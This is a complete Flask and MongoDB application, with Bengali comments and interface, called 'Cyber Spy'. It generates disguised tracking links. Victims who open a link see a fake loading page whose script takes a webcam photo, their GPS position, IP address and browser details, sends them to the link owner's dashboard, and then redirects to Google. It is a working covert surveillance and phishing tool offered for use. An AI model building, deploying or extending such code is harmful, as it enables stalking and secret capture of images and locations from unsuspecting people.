from flask import Flask, render_template_string, request, redirect, url_for, session
from pymongo import MongoClient
import datetime
import hashlib
import os
import requests
import uuid

app = Flask(__name__)
app.secret_key = os.urandom(24)

# ===== MongoDB সংযোগ (MONGO_URI এনভায়রনমেন্ট ভেরিয়েবল থেকে নাও) =====
MONGO_URI = os.environ.get('MONGO_URI')
if not MONGO_URI:
    raise Exception("MONGO_URI environment variable not set!")

client = MongoClient(MONGO_URI)
db = client['spy_db']
users_col = db['users']

# ===== লগইন পেজ =====
LOGIN_HTML = """
<!DOCTYPE html>
<html>
<head><title>লগইন – Cyber Spy</title>
<style>
body{background:#0a0e17;color:#00ffcc;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh}
.box{background:#111927;padding:30px;border-radius:15px;width:350px}
input,button{width:100%;padding:12px;margin:6px 0;border-radius:8px;border:1px solid #334466;background:#0b111e;color:#c0d4ff}
button{background:#ff004422;border-color:#ff0044;cursor:pointer}
h2{text-align:center;color:#ff0044}
</style>
</head>
<body>
<div class="box">
    <h2>🕵️ Cyber Spy</h2>
    <p style="color:#886688;text-align:center;">Developer: Arif</p>
    <form method="POST">
        <input type="text" name="username" placeholder="ইউজারনেম" required>
        <input type="password" name="password" placeholder="পাসওয়ার্ড" required>
        <button type="submit">লগইন</button>
    </form>
    <a href="/register" style="color:#00ffcc;">নতুন ইউজার?</a>
    {% if error %}<p style="color:#ff8866;">{{ error }}</p>{% endif %}
</div>
</body>
</html>
"""

REGISTER_HTML = """
<!DOCTYPE html>
<html>
<head><title>রেজিস্টার – Cyber Spy</title>
<style>
body{background:#0a0e17;color:#00ffcc;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh}
.box{background:#111927;padding:30px;border-radius:15px;width:350px}
input,button{width:100%;padding:12px;margin:6px 0;border-radius:8px;border:1px solid #334466;background:#0b111e;color:#c0d4ff}
button{background:#ff004422;border-color:#ff0044;cursor:pointer}
h2{text-align:center;color:#ff0044}
</style>
</head>
<body>
<div class="box">
    <h2>🕵️ সাইন আপ</h2>
    <p style="color:#886688;text-align:center;">Developer: Arif</p>
    <form method="POST">
        <input type="text" name="username" placeholder="ইউজারনেম" required>
        <input type="password" name="password" placeholder="পাসওয়ার্ড" required>
        <button type="submit">রেজিস্টার</button>
    </form>
    <a href="/login" style="color:#00ffcc;">ইতিমধ্যে আছে?</a>
</div>
</body>
</html>
"""

DASHBOARD_HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cyber Spy • Developer Arif</title>
    <style>
        body{background:#0a0e17;color:#00ffcc;font-family:monospace;padding:20px}
        .container{max-width:1200px;margin:auto;background:#111927;padding:25px;border-radius:15px}
        h1{color:#ff0044;text-align:center}
        .brand{color:#ff8866;font-size:14px;text-align:center;margin-bottom:20px}
        .card{background:#1a2332;padding:15px;border-radius:10px;margin:15px 0}
        input,button{width:100%;padding:12px;margin:6px 0;border-radius:8px;border:1px solid #334466;background:#0b111e;color:#c0d4ff}
        button{background:#ff004422;border-color:#ff0044;cursor:pointer}
        table{width:100%;border-collapse:collapse;margin-top:15px}
        th,td{border:1px solid #334466;padding:8px;text-align:left;color:#c0d4ff}
        th{background:#1a2332;color:#ff0044}
        .del-btn{background:#ff004422;border:1px solid #ff0044;padding:5px 10px;border-radius:5px;cursor:pointer;color:#ffccbb}
        .logout{float:right;background:#334466;padding:8px 15px;border-radius:8px;cursor:pointer;color:#c0d4ff}
    </style>
</head>
<body>
<div class="container">
    <h1>🕵️ Cyber Spy</h1>
    <div class="brand">Developer: Arif • v2.0</div>
    <div style="overflow:auto;">
        <span style="color:#6688aa;">স্বাগতম, {{ user.username }}</span>
        <a href="/logout" class="logout">🚪 লগআউট</a>
    </div>

    <div class="card">
        <h3>📎 নতুন লিংক তৈরি করুন</h3>
        <form method="POST" action="/create_link">
            <input type="text" name="link_name" placeholder="লিংকের নাম (যেমন: ফেসবুক টুল)" required>
            <button type="submit">🔗 লিংক জেনারেট করুন</button>
        </form>
    </div>

    <div class="card">
        <h3>📌 আপনার লিংকসমূহ</h3>
        {% for link in user.links %}
        <div style="background:#0d1520;padding:12px;border-radius:8px;margin:8px 0;display:flex;justify-content:space-between;flex-wrap:wrap;">
            <span>{{ link.name }}: <a href="{{ link.url }}" target="_blank">{{ link.url }}</a></span>
            <span>👁️ {{ link.visits|length }} টি ক্লিক</span>
            <a href="/view_link/{{ link.id }}" style="color:#ff0044;">📊 দেখুন</a>
        </div>
        {% else %}
        <p style="color:#6688aa;">কোনো লিংক তৈরি করেননি।</p>
        {% endfor %}
    </div>
</div>
</body>
</html>
"""

VIEW_LINK_HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ভিজিটর ডেটা – {{ link.name }}</title>
    <style>
        body{background:#0a0e17;color:#00ffcc;font-family:monospace;padding:20px}
        .container{max-width:1400px;margin:auto;background:#111927;padding:25px;border-radius:15px}
        h1{color:#ff0044;text-align:center}
        table{width:100%;border-collapse:collapse;margin-top:20px;font-size:13px}
        th,td{border:1px solid #334466;padding:8px;text-align:left;color:#c0d4ff}
        th{background:#1a2332;color:#ff0044}
        .del-btn{background:#ff004422;border:1px solid #ff0044;padding:5px 10px;border-radius:5px;cursor:pointer;color:#ffccbb}
        .back{color:#6688aa;cursor:pointer;margin-bottom:10px;display:inline-block}
    </style>
</head>
<body>
<div class="container">
    <a href="/dashboard" class="back">⬅️ ড্যাশবোর্ডে ফিরুন</a>
    <h1>📊 {{ link.name }} – ভিজিটর ডেটা</h1>
    <p style="color:#6688aa;">মোট ভিজিট: {{ link.visits|length }}</p>
    <table>
        <tr><th>#</th><th>IP</th><th>লোকেশন</th><th>GPS</th><th>ব্রাউজার</th><th>ক্যামেরা</th><th>স্ক্রিনশট</th><th>সময়</th><th>অ্যাকশন</th></tr>
        {% for v in link.visits %}
        <tr>
            <td>{{ loop.index }}</td>
            <td>{{ v.ip }}</td>
            <td>{{ v.city }}, {{ v.country }}</td>
            <td>{{ v.gps or 'নেই' }}</td>
            <td>{{ v.user_agent[:30] }}...</td>
            <td><img src="{{ v.camera or '' }}" width="50" /></td>
            <td><img src="{{ v.screenshot or '' }}" width="50" /></td>
            <td>{{ v.time }}</td>
            <td><a href="/delete_visit/{{ link.id }}/{{ loop.index0 }}" class="del-btn">🗑️</a></td>
        </tr>
        {% endfor %}
    </table>
</div>
</body>
</html>
"""

COLLECTOR_HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>🔐 লোড হচ্ছে...</title>
    <style>
        body{background:#0a0e17;color:#00ffcc;display:flex;justify-content:center;align-items:center;height:100vh;flex-direction:column}
        .loader{border:4px solid #1a2332;border-top:4px solid #ff0044;border-radius:50%;width:50px;height:50px;animation:spin 1s linear infinite}
        @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
    </style>
</head>
<body>
    <div class="loader"></div>
    <p>⏳ সংযোগ স্থাপন করা হচ্ছে...</p>
    <script>
        let gps = 'অনুমতি নেই';
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                pos => { gps = pos.coords.latitude + ',' + pos.coords.longitude; },
                err => { gps = 'ব্যর্থ'; }
            );
        }
        let camera = null;
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                setTimeout(() => {
                    const canvas = document.createElement('canvas');
                    canvas.width = 320; canvas.height = 240;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    camera = canvas.toDataURL('image/jpeg');
                    stream.getTracks().forEach(t => t.stop());
                    sendData();
                }, 2000);
            })
            .catch(() => { camera = 'ব্যর্থ'; sendData(); });

        function captureScreen() {
            const canvas = document.createElement('canvas');
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
            const ctx = canvas.getContext('2d');
            ctx.fillStyle = '#0a0e17';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = '#00ffcc';
            ctx.font = '20px monospace';
            ctx.fillText('সিকিউর স্ক্রিন', 20, 50);
            return canvas.toDataURL('image/png');
        }

        function sendData() {
            const data = {
                ip: "{{ ip }}",
                user_agent: navigator.userAgent,
                screen: screen.width + "x" + screen.height,
                gps: gps,
                camera: camera,
                screenshot: captureScreen(),
                time: new Date().toLocaleString()
            };
            fetch('/collect/{{ link_id }}', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            }).then(() => {
                setTimeout(() => {
                    window.location.href = 'https://www.google.com';
                }, 2000);
            });
        }
    </script>
</body>
</html>
"""

# ===== হেল্পার ফাংশন =====
def get_user(username):
    return users_col.find_one({'username': username})

def create_user(username, password):
    hashed = hashlib.sha256(password.encode()).hexdigest()
    user = {
        'username': username,
        'password': hashed,
        'links': []
    }
    users_col.insert_one(user)
    return user

# ===== রাউট =====
@app.route('/')
def home():
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        user = get_user(username)
        if user and user['password'] == hashlib.sha256(password.encode()).hexdigest():
            session['user'] = username
            return redirect(url_for('dashboard'))
        return render_template_string(LOGIN_HTML, error='ভুল ক্রেডেনশিয়াল')
    return render_template_string(LOGIN_HTML, error=None)

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        if get_user(username):
            return render_template_string(LOGIN_HTML, error='ইউজারনেম নেওয়া হয়েছে')
        create_user(username, password)
        return redirect(url_for('login'))
    return render_template_string(REGISTER_HTML)

@app.route('/dashboard')
def dashboard():
    if 'user' not in session:
        return redirect(url_for('login'))
    user = get_user(session['user'])
    if not user:
        session.clear()
        return redirect(url_for('login'))
    return render_template_string(DASHBOARD_HTML, user=user)

@app.route('/create_link', methods=['POST'])
def create_link():
    if 'user' not in session:
        return redirect(url_for('login'))
    link_name = request.form['link_name']
    link_id = str(uuid.uuid4())[:8]
    new_link = {
        'id': link_id,
        'name': link_name,
        'url': request.host_url + 'c/' + link_id,
        'visits': []
    }
    users_col.update_one({'username': session['user']}, {'$push': {'links': new_link}})
    return redirect(url_for('dashboard'))

@app.route('/c/<link_id>')
def collector_page(link_id):
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    try:
        loc = requests.get(f'http://ip-api.com/json/{ip}', timeout=2).json()
        city = loc.get('city', 'অজানা')
        country = loc.get('country', 'অজানা')
    except:
        city = 'অজানা'
        country = 'অজানা'
    return render_template_string(COLLECTOR_HTML, ip=ip, city=city, country=country, link_id=link_id)

@app.route('/collect/<link_id>', methods=['POST'])
def collect_data(link_id):
    data = request.get_json()
    if not data:
        return 'ERROR', 400
    data['time'] = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    # লোকেশন যোগ করি
    ip = data.get('ip')
    if ip:
        try:
            loc = requests.get(f'http://ip-api.com/json/{ip}', timeout=2).json()
            data['city'] = loc.get('city', 'অজানা')
            data['country'] = loc.get('country', 'অজানা')
        except:
            data['city'] = 'অজানা'
            data['country'] = 'অজানা'
    else:
        data['city'] = 'অজানা'
        data['country'] = 'অজানা'
    # লিংক আপডেট করো
    result = users_col.update_one(
        {'links.id': link_id},
        {'$push': {'links.$.visits': data}}
    )
    if result.matched_count:
        return 'OK', 200
    return 'ERROR', 404

@app.route('/view_link/<link_id>')
def view_link(link_id):
    if 'user' not in session:
        return redirect(url_for('login'))
    user = get_user(session['user'])
    if not user:
        session.clear()
        return redirect(url_for('login'))
    link = None
    for l in user['links']:
        if l['id'] == link_id:
            link = l
            break
    if not link:
        return 'লিংক পাওয়া যায়নি', 404
    return render_template_string(VIEW_LINK_HTML, link=link)

@app.route('/delete_visit/<link_id>/<int:index>')
def delete_visit(link_id, index):
    if 'user' not in session:
        return redirect(url_for('login'))
    user = get_user(session['user'])
    if not user:
        session.clear()
        return redirect(url_for('login'))
    # লিংক খুঁজে ভিজিট ডিলিট করো
    for l in user['links']:
        if l['id'] == link_id:
            if 0 <= index < len(l['visits']):
                l['visits'].pop(index)
                users_col.update_one(
                    {'username': session['user'], 'links.id': link_id},
                    {'$set': {'links.$.visits': l['visits']}}
                )
                break
    return redirect(url_for('view_link', link_id=link_id))

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)